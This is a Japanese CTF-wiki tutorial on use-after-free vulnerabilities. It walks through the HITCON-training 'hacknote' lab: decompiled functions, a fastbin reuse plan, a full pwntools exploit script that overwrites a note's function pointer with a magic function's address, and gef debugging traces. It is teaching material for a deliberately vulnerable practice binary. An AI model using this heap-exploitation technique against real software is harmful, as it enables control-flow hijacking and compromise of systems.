# Use After Free

## 原理

簡単に言えば、Use After Free は文字どおりの意味で、メモリブロックが解放された後に再び使われることです。ただし実際には、次のようないくつかのケースがあります。

- メモリブロックが解放された後、対応するポインタが NULL に設定され、その後再び使われた場合、当然プログラムはクラッシュします。
- メモリブロックが解放された後、対応するポインタが NULL に設定されず、次に使われる前にこのメモリブロックを書き換えるコードがなければ、**プログラムはおそらく正常に動作します**。
- メモリブロックが解放された後、対応するポインタが NULL に設定されず、次に使われる前にこのメモリを書き換えるコードがあれば、プログラムが再びこのメモリを使うとき、**おかしな問題が起きる可能性が高くなります**。


一般に **Use After Free** 脆弱性と言うときは、主に後の 2 つを指します。また、**解放された後に NULL に設定されないメモリポインタを、一般にダングリングポインタ(dangling pointer)と呼びます。**

簡単な例を挙げます。

```c++
#include <stdio.h>
#include <stdlib.h>
typedef struct name {
  char *myname;
  void (*func)(char *str);
} NAME;
void myprint(char *str) { printf("%s\n", str); }
void printmyname() { printf("call print my name\n"); }
int main() {
  NAME *a;
  a = (NAME *)malloc(sizeof(struct name));
  a->func = myprint;
  a->myname = "I can also use it";
  a->func("this is my function");
  // free without modify
  free(a);
  a->func("I can also use it");
  // free with modify
  a->func = printmyname;
  a->func("this is my function");
  // set NULL
  a = NULL;
  printf("this pogram will crash...\n");
  a->func("can not be printed...");
}
```

実行結果は次のとおりです。

```shell
➜  use_after_free git:(use_after_free) ✗ ./use_after_free                      
this is my function
I can also use it
call print my name
this pogram will crash...
[1]    38738 segmentation fault (core dumped)  ./use_after_free
```

## 例

ここでは HITCON-training の [lab 10 hacknote](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/use_after_free/hitcon-training-hacknote) を例にします。

### 機能の分析

プログラムを簡単に分析すると、プログラムの冒頭に menu 関数があり、その中に次のコードがあることがわかります。

```c
  puts(" 1. Add note          ");
  puts(" 2. Delete note       ");
  puts(" 3. Print note        ");
  puts(" 4. Exit              ");
```

したがって、プログラムには主に 3 つの機能があるはずです。その後、プログラムはユーザの入力に応じて対応する機能を実行します。

#### add_note

プログラムから、最大 5 個の note を追加できることがわかります。各 note には 2 つのフィールド `void (*printnote)();` と `char *content;` があり、`printnote` には `content` の具体的な内容を出力する関数が設定されます。

note の構造体定義は次のとおりです。
```c
struct note {
  void (*printnote)();
  char *content;
};
```
add_note 関数のコードは次のとおりです。
```c++
unsigned int add_note()
{
  note *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !notelist[i] )
      {
        notelist[i] = malloc(8u);
        if ( !notelist[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        notelist[i]->put = print_note_content;
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = notelist[i];
        v0->content = malloc(size);
        if ( !notelist[i]->content )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, notelist[i]->content, size);
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

#### print_note

print_note は、指定された note のインデックスに従って、対応する note の内容を出力するだけの関数です。

```c
unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
    notelist[v1]->put(notelist[v1]);
  return __readgsdword(0x14u) ^ v3;
}
```

#### delete_note

delete_note は、指定されたインデックスに従って対応する note を解放します。ただし注目すべきことに、削除のとき単に free しているだけで NULL には設定していないため、ここには明らかに Use After Free が存在します。

```c
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
  {
    free(notelist[v1]->content);
    free(notelist[v1]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

### 攻撃の分析

Use After Free は確かに起こりうることがわかりました。では、どうすればそれを発生させて攻撃に利用できるでしょうか。また、このプログラムには magic 関数もあることに注意してください。use after free を使って、このプログラムに magic 関数を実行させることはできないでしょうか。**直接的な考えとしては、note の `printnote` フィールドを magic 関数のアドレスに書き換え、`printnote` を実行するときに magic 関数を実行させる方法があります。** では、どう実行させればよいでしょうか。

各 note が生成される具体的な流れを簡単に見てみましょう。

1. プログラムは 8 バイトのメモリを確保し、note 内の printnote と content のポインタを格納します。
2. プログラムは入力された size に従って指定サイズのメモリを確保し、content を格納するのに使います。

           +-----------------+                       
           |   printnote     |                       
           +-----------------+                       
           |   content       |       size              
           +-----------------+------------------->+----------------+
                                                  |     real       |
                                                  |    content     |
                                                  |                |
                                                  +----------------+

これまでヒープの実装で学んだことから、note が fastbin chunk(サイズ 16 バイト)であることは明らかです。目的は、ある note の put フィールドを magic 関数のアドレスにすることなので、何とかしてある note の printnote ポインタを magic のアドレスで上書きする必要があります。プログラム中で printnote に代入している箇所は 1 か所だけなので、real content を書き込むときに上書きするしかありません。具体的な方針は次のとおりです。

- note0 を確保する。real content の size は 16(note のサイズが属する bin とは別のサイズであればよい)
- note1 を確保する。real content の size は 16(note のサイズが属する bin とは別のサイズであればよい)
- note0 を解放する
- note1 を解放する
- このとき、サイズ 16 の fast bin chunk のリストは note1->note0 になる
- note2 を確保し、real content のサイズを 8 にすると、ヒープの確保規則により次のようになる
  - note2 には、実際には note1 に対応するメモリブロックが確保される。
  - real content に対応するチャンクは、実際には note0 になる。
- このとき note2 の real content のチャンク部分に magic のアドレスを書き込めば、note0 は NULL にされていないため、再び note0 を出力しようとしたときにプログラムが magic 関数を呼び出す。

### 攻撃スクリプト

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./hacknote')


def addnote(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))


def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


#gdb.attach(r)
magic = 0x08048986

addnote(32, "aaaa") # add note 0
addnote(32, "ddaa") # add note 1

delnote(0) # delete note 0
delnote(1) # delete note 1

addnote(8, p32(magic)) # add note 2

printnote(0) # print note 0

r.interactive()
```

実行の流れを具体的に見てみましょう。まずブレークポイントを設定します。

**malloc の 2 か所にブレークポイントを設定**

```shell
gef➤  b *0x0804875C
Breakpoint 1 at 0x804875c
gef➤  b *0x080486CA
Breakpoint 2 at 0x80486ca
```

**free の 2 か所にブレークポイントを設定**

```shell
gef➤  b *0x08048893
Breakpoint 3 at 0x8048893
gef➤  b *0x080488A9
Breakpoint 4 at 0x80488a9
```

続けてプログラムを実行すると、note0 を確保したとき、確保されたメモリブロックのアドレスは 0x0804b008 であることがわかります。(eax には関数の戻り値が入ります)

```asm
$eax   : 0x0804b008  →  0x00000000
$ebx   : 0x00000000
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b008  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x080486cf  →  <add_note+89> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x80486c2 <add_note+76>    add    DWORD PTR [eax], eax
    0x80486c4 <add_note+78>    add    BYTE PTR [ebx+0x86a0cec], al
    0x80486ca <add_note+84>    call   0x80484e0 <malloc@plt>
 →  0x80486cf <add_note+89>    add    esp, 0x10
    0x80486d2 <add_note+92>    mov    edx, eax
    0x80486d4 <add_note+94>    mov    eax, DWORD PTR [ebp-0x1c]
    0x80486d7 <add_note+97>    mov    DWORD PTR [eax*4+0x804a070], edx
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf10', 'l8']
8
0xffffcf10│+0x00: 0x00000008	 ← $esp
0xffffcf14│+0x04: 0x00000000
0xffffcf18│+0x08: 0xf7e29ef5  →  <strtol+5> add eax, 0x18210b
0xffffcf1c│+0x0c: 0xf7e27260  →  <atoi+16> add esp, 0x1c
0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000
0xffffcf24│+0x14: 0x00000000
0xffffcf28│+0x18: 0x0000000a
0xffffcf2c│+0x1c: 0x00000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
---Type <return> to continue, or q <return> to quit---
[#0] 0x80486cf → Name: add_note()
[#1] 0x8048ac5 → Name: main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap chunk 0x0804b008
UsedChunk(addr=0x804b008, size=0x10)
Chunk size: 16 (0x10)
Usable size: 12 (0xc)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

**note 0 の content として確保されたアドレスは 0x0804b018**

```asm
$eax   : 0x0804b018  →  0x00000000
$ebx   : 0x0804b008  →  0x0804865b  →  <print_note_content+0> push ebp
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b018  →  0x00000000
$esp   : 0xffffcf10  →  0x00000020
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x08048761  →  <add_note+235> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x8048752 <add_note+220>   mov    al, ds:0x458b0804
    0x8048757 <add_note+225>   call   0x581173df
    0x804875c <add_note+230>   call   0x80484e0 <malloc@plt>
 →  0x8048761 <add_note+235>   add    esp, 0x10
    0x8048764 <add_note+238>   mov    DWORD PTR [ebx+0x4], eax
    0x8048767 <add_note+241>   mov    eax, DWORD PTR [ebp-0x1c]
    0x804876a <add_note+244>   mov    eax, DWORD PTR [eax*4+0x804a070]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf10', 'l8']
8
0xffffcf10│+0x00: 0x00000020	 ← $esp
0xffffcf14│+0x04: 0xffffcf34  →  0xf70a3233
0xffffcf18│+0x08: 0x00000008
0xffffcf1c│+0x0c: 0xf7e27260  →  <atoi+16> add esp, 0x1c
0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000
0xffffcf24│+0x14: 0x00000000
0xffffcf28│+0x18: 0x0000000a
0xffffcf2c│+0x1c: 0x00000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
---Type <return> to continue, or q <return> to quit---
[#0] 0x8048761 → Name: add_note()
[#1] 0x8048ac5 → Name: main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap chunk 0x0804b018
UsedChunk(addr=0x804b018, size=0x28)
Chunk size: 40 (0x28)
Usable size: 36 (0x24)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

同様に、note1 のアドレスとその content のアドレスは、それぞれ 0x0804b040 と 0x0804b050 だとわかります。

また、note0 と note1 に対応する content が確かに対応するメモリブロックであることも確認できます。

```asm
gef➤  grep aaaa
[+] Searching 'aaaa' in memory
[+] In '[heap]'(0x804b000-0x806c000), permission=rw-
  0x804b018 - 0x804b01c  →   "aaaa" 
gef➤  grep ddaa
[+] Searching 'ddaa' in memory
[+] In '[heap]'(0x804b000-0x806c000), permission=rw-
  0x804b050 - 0x804b054  →   "ddaa" 
```

次は free の過程です。順に見ていくと、まず note0 の content が free されます。

```asm
 →  0x8048893 <del_note+143>   call   0x80484c0 <free@plt>
   ↳   0x80484c0 <free@plt+0>     jmp    DWORD PTR ds:0x804a018
       0x80484c6 <free@plt+6>     push   0x18
       0x80484cb <free@plt+11>    jmp    0x8048480
       0x80484d0 <__stack_chk_fail@plt+0> jmp    DWORD PTR ds:0x804a01c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf20', 'l8']
8
0xffffcf20│+0x00: 0x0804b018  →  "aaaa"	 ← $esp

```

次に note0 自身です。

```asm
 →  0x80488a9 <del_note+165>   call   0x80484c0 <free@plt>
   ↳   0x80484c0 <free@plt+0>     jmp    DWORD PTR ds:0x804a018
       0x80484c6 <free@plt+6>     push   0x18
       0x80484cb <free@plt+11>    jmp    0x8048480
       0x80484d0 <__stack_chk_fail@plt+0> jmp    DWORD PTR ds:0x804a01c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf20', 'l8']
8
0xffffcf20│+0x00: 0x0804b008  →  0x0804865b  →  <print_note_content+0> push ebp	 ← $esp
```

delete が終わった後で bins を見ると、確かに対応する fast bin に格納されていることがわかります。

```c++
gef➤  heap bins
───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b008, size=0x10) 
Fastbins[idx=1, size=0xc] 0x00
Fastbins[idx=2, size=0x10] 0x00
Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b018, size=0x28) 
Fastbins[idx=4, size=0x18] 0x00
Fastbins[idx=5, size=0x1c] 0x00
Fastbins[idx=6, size=0x20] 0x00

```

note1 もすべて削除した後で、再び bins を見ます。後から削除したチャンクが確かにリストの先頭にあることがわかります。

```asm
gef➤  heap bins
───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b040, size=0x10)  ←  UsedChunk(addr=0x804b008, size=0x10) 
Fastbins[idx=1, size=0xc] 0x00
Fastbins[idx=2, size=0x10] 0x00
Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b050, size=0x28)  ←  UsedChunk(addr=0x804b018, size=0x28) 
Fastbins[idx=4, size=0x18] 0x00
Fastbins[idx=5, size=0x1c] 0x00
Fastbins[idx=6, size=0x20] 0x00

```

このとき、これから note2 を確保します。note2 にどのメモリブロックが確保されるかを見てみましょう。

**note2 に対応するメモリブロックは 0x804b040 で、これは実は note1 に対応するメモリアドレスです。**

```asm
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(8)=0x804b040
0x080486cf in add_note ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x0804b040  →  0x0804b000  →  0x00000000
$ebx   : 0x00000000
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b040  →  0x0804b000  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x080486cf  →  <add_note+89> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x80486c2 <add_note+76>    add    DWORD PTR [eax], eax
    0x80486c4 <add_note+78>    add    BYTE PTR [ebx+0x86a0cec], al
    0x80486ca <add_note+84>    call   0x80484e0 <malloc@plt>
 →  0x80486cf <add_note+89>    add    esp, 0x10

```

**note2 の content として確保されたメモリアドレスは 0x804b008 で、これは note0 に対応するアドレスです。つまり、ここで note2 の content に書き込むと、note0 の put フィールドが上書きされます。**

```asm
gef➤  n 1
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(8)=0x804b008
0x08048761 in add_note ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x0804b008  →  0x00000000
$ebx   : 0x0804b040  →  0x0804865b  →  <print_note_content+0> push ebp
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b008  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x08048761  →  <add_note+235> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x8048752 <add_note+220>   mov    al, ds:0x458b0804
    0x8048757 <add_note+225>   call   0x581173df
    0x804875c <add_note+230>   call   0x80484e0 <malloc@plt>
 →  0x8048761 <add_note+235>   add    esp, 0x10
```

具体的に確かめてみましょう。上書き前の状態を見ると、このメモリブロックの `printnote` ポインタはすでに NULL になっています。これは fastbin の free の仕組みによるものです。

```asm
gef➤  x/2xw 0x804b008
0x804b008:	0x00000000	0x0804b018
```

上書き後の具体的な値は次のとおりです。

```asm
gef➤  x/2xw 0x804b008
0x804b008:	0x08048986	0x0804b00a
gef➤  x/i 0x08048986
   0x8048986 <magic>:	push   ebp
```

確かに、狙いどおり magic 関数で上書きされていることがわかります。

最終的な実行結果は次のとおりです。

```shell
[+] Starting local process './hacknote': pid 35030
[*] Switching to interactive mode
flag{use_after_free}----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
```

また、gef の heap-analysis-helper を使うと、ヒープ全体の確保と解放の様子を次のように確認できます。

```asm
gef➤  heap-analysis-helper 
[*] This feature is under development, expect bugs and unstability...
[+] Tracking malloc()
[+] Tracking free()
[+] Tracking realloc()
[+] Disabling hardware watchpoints (this may increase the latency)
[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.
[*] Note: The heap analysis slows down noticeably the execution. 
gef➤  c
Continuing.
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(32)=0x804b018
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(32)=0x804b050
[+] Heap-Analysis - free(0x804b018)
[+] Heap-Analysis - watching 0x804b018
[+] Heap-Analysis - free(0x804b008)
[+] Heap-Analysis - watching 0x804b008
[+] Heap-Analysis - free(0x804b050)
[+] Heap-Analysis - watching 0x804b050
[+] Heap-Analysis - free(0x804b040)
[+] Heap-Analysis - watching 0x804b040
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - Cleaning up
[+] Heap-Analysis - Re-enabling hardware watchpoints
[New process 36248]
process 36248 is executing new program: /bin/dash
[New process 36249]
process 36249 is executing new program: /bin/cat
[Inferior 3 (process 36249) exited normally]
```

最初の出力が 2 回出ていますが、gef ツールの問題だと思われます。

## 問題

- 2016 HCTF fheap

